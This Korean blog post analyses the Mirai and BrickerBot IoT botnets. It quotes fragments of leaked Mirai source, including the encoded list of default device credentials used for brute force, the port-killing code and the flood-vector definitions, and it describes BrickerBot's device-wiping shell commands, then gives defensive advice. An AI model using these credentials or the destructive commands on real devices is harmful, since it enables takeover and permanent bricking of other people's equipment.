---
layout: post
title:  "IoT Botnet Mirai vs Bricker"
tag:   Analysis
categories: IoT Analysis mirai Bricker persu
modified: 2017-04-26
comments: true
featured: true
---
# Mirai Botnet

- 원문(Reference) : https://security.radware.com/ddos-threats-attacks/threat-advisories-attack-reports/mirai-botnet/

Mirai Botnet은 대규모 DDoS 공격을 3건 발생 시켰으며, 강력하고 정교한 방식으로 DDos를 발생 시킨다.

Mirai Botnet은 1TB 급 트래픽 발생을 통해 공격 서비스 거부 시킬 수 있으며, 공격 방식은 미리 정의된 10가지 벡터가 존재한다.
그 중 GRE Flood, TCP STOMP, Water Torture, DNS Query 호출과 같은 공격 벡터가 존재하게 된다.

### IoT Device가 DDoS Botnet 으로  매력적인 이유
1. EndPoint 보안의 부재
2. IoT 디바이스의 안전 및 보안에 관한 규정이나 표준이 부재하여 기본 암호 정책, 액세스 제어 권한, 보안 구성과 같은 설정이 미흡
3. 24시간 * 365일 사용이 가능
4. 0-day Attack이 비교적 쉽기 때문에 빠른 감염이 가능

Botnet은 "C" 로 구현되어 있으며, C&C 서버는 "GO"로 구현되어 있다.


## Mirai botnet 동작과정

- 구현을 통한 분석 : https://www.rsaconference.com/writable/presentations/file_upload/hta-w10-mirai-and-iot-botnet-analysis.pdf

### 1. brute force을 통한 IoT Device 접근

Mirai Botnet은 기본적으로 공인 IP를 가진 IoT Device에 포트 스캔을 실시하며(shodan 과 같은 웹 사이트 이용) SSH, Telnet과 같이 원격에서 시스템에 접근 가능한 (Shell 접근을 의미) 포트를 스캔하게 되고 미리 정의된 계정을 brute force 공격을 하게 된다.

- Telmet, SSH brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
```

위 내용을 통해 다양한 디폴트 계정을 가지고 있는 것을 알 수 있다.

### 2. Find CPU info

위 디폴트 계정을 통해 shell에 접근하게 되면, Botnet을 생성하기 위해 CPU 버전을 아래 그림과 같이 확인하게 된다. MIPS, ARM, x86 etc...

<img src="{{ site.url }}/images/persu/mirai.png" style="display: block; margin: auto;">

### 3. Mirai Botnet Download
1,2 번 단계를 거치게 되면 실제로 Botnet을 다운로드 받게 되는데 /bin/busybox 에서 wget, tftp, ECCHI 명령어가 실행되는지 찾게 된다.

<img src="{{ site.url }}/images/persu/mirai0.png" style="display: block; margin: auto;">

만약 위의 명령어가 없을 시 echo -ne 명령어를 통해 "upnp" 라는 바이너리를 만들게 된다. (이거 보통 삽질 아님....)

<img src="{{ site.url }}/images/persu/mirai1.png" style="display: block; margin: auto;">

### 4. Start Mirai Botnet
3번 과정을 통해 Mirai Botnet을 다운로드 받은 이후에는 실행하게 되는데 "mirai" 라는 메시지가 발생하는 것을 확인 할 수 있다.

<img src="{{ site.url }}/images/persu/mirai2.png" style="display: block; margin: auto;">

### 5. Port Kill & restart
Mirai botnet이 실행하면 처음 기존에 활성화 되었던 Telnet, SSH, HTTP 서비스를 죽이고 다른포트로 활성화 시키는 방법이다. 이는 botnet 감염의 대응을 늦추기 위함이라고 생각한다.

Telnet, SSH, HTTP Kill : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c

```c
// Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif
```

### 6. Command & Control
C&C 서버는 활성화된 Telnet, SSH 포트를 통해 명령을 전송하게 된다.

기본적으로 TCP SYN, ACK Flooding과 같은 기본적인 DDoS 공격 벡터 뿐만 아니라 새롭게 발견되고 있는 GRE IP, Ethernet Flooding 또한 공격 벡터에 가지고 있다. DDoS 탐지 기법을 우회하는 공격 벡터까지 구성된다.

- DDoS vector : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack.h

```
#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
//#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
#define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
```




# Bricker botnet


본 글은 최근 이슈가 되고 있는 IoT Botnet인 Bricker에 대해 조사해 보았다.
원문(Reference) : https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-permanent-denial-of-service/

- Botnet : https://ko.wikipedia.org/wiki/%EB%B4%87%EB%84%B7

IoT 시대에서 많은 디바이스들이 점차적으로 인터넷을 사용하게 되는 초연결 사회가 이뤄지고 있다. 이런 IoT의 가용성을 해치는 PDoS 공격이 급증하고 있다.

- PDoS(Permanent Denial of Service attacks) : 영구적인 서비스 거부 공격

이러한 PDoS 공격은 시스템을 손상시켜 하드웨어를 교체하거나 다시 설치해야 하는 공격이다. 시스템을 과부화를 일으키는 DDoS와는 약간 다른 형태의 DoS다.

1,895 건의 PDoS 공격을 일으킨 Bricker_Bot은 두 차례 공격 시도를 하였으며, C&C 서버는 TOR Node에 의해 발견되지 않았다.

Bricker_Bot의 공격 방식은 "Telnet brute force" 에서 부터 시작된다. Telnet brute force은 Mirai에서 사용된 것과 동일한 공격 코드이며, 아래 github에서 내용을 확인 할 수 있다.

- Mirai code : https://github.com/jgamblin/Mirai-Source-Code

Telnet brute force 방식에 사용되었던 자체 DB는 아래 소스 코드와 같다.

- Telmet brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
...
```

기본적인 Telnet 을 구성하기 위해 TCP/IP Protocol Header을 구성하고, add_auth_entry에 있는 IoT 디바이스의 초기 계정을 접근하게 구성하였다.

"Telnet brute force"를 통해 시스템에 접근하게 되면(shell 접근을 의미) 먼저 장치 손상(Corrupting a Device)을 입히게 됩니다.

### Corrupting a Device

PDos의 가장 큰 목적인 장치 손상은 Linux shell code를 실행 시켜 인터넷 연결, 장치 성능이 정의된 파일을 지우는 명령을 수행한다.

<img src="{{ site.url }}/images/persu/brickerbot1.jpg" style="display: block; margin: auto;">

플래시 카드, 메모리 등 표준과 일치하는 저장 매체가 랜덤한 값으로 덮어 쓰여지게 된다.
이후 route del을 통해 routing table을 삭제하게 된다. 이럴 경우 리눅스는 다시 routing 작업을 실시하게 되는데 이를 막기 위해 sysctl 명령을 통해 커널 매개 변수를 조작하게 된다.

- net.ipv4.tcp_timestamps=0 : TCP timestamps를 0으로 설정 WAN 구간에서 네트워크가 안되는 현상 발생
- kernel.threads-max=1 : 커널에서 발생할 수 있는 최대 스레드를 -1로 설정

이렇게 되면 저장매체에 있는 데이터는 임의의 값으로 초기화가 될 것이며, 네트워크 통신 또한 이뤄지지 않게 된다.

### Target
일차적으로 공격 대상이 되는 IoT 디바이스는 Mirai_Bot에 존재하는 auth_entry 계정을 가진 디바이스이며, busybox 기반의 Telnet을 지원하는 디바이스이다. 이 디바이스는 공인망에 포트가 오픈되어 있는 특징을 가지게 된다.
더 나아가 dropbear SSH 와 같이 22번 포트가 오픈되어 있는 디바이스 또한 공격의 대상이 되기도 한다.


전 세계적으로 한번에 333 여곳에서 PDoS를 발생시켰어며, 다음 명령 수행을 하는 bricker_bot version 2는 아래와 같다.

<img src="{{ site.url }}/images/persu/brickerbot2.jpg" style="display: block; margin: auto;">

rm -rf 를 통해 모든 장치를 지워버리며, TCP timestamps 비활성화, 커널 스레드 최대수 1 뿐 만 아니라 iptables를 초기화 하며 NAT 규칙까지 삭제하고 out-bound packet을 차단하게 되어 네트워크 통신이 이뤄지지 않도록 구성한다.


### Time
두 PDoS 공격은 같은 날과 거의 같은 시간에 시작되었다. 2017 년 3 월 20 일 9.51PM, 2017 년 3 월 20 일 9.10PM 두 차례 발생하였다. BrickerBot.1의 첫 번째 PDoS 공격은 중지되었지만 더 치밀하게 TOR 출구 노드를 사용하는 BrickerBot.2의 공격은 여전히 ​​활성화되어 진행 중이다.

### Protecting
BrickerBot 감염을 막기 위해서는 가장 기본적인 대응방안이 필요하다. 각 디바이스는 Telnet, SSH와 같은 원격 단말 관리 서비스를 비활성화 시켜야 하며, 필요에 의해 활성화 시킬 경우 각 디바이스 별로 유니크한 패스워드 정책을 수립해야 한다. 특히 SSH 사용 시 로그인 방식이 아닌 키교환을 통해 로그인할 수 있도록 구성해야 한다.
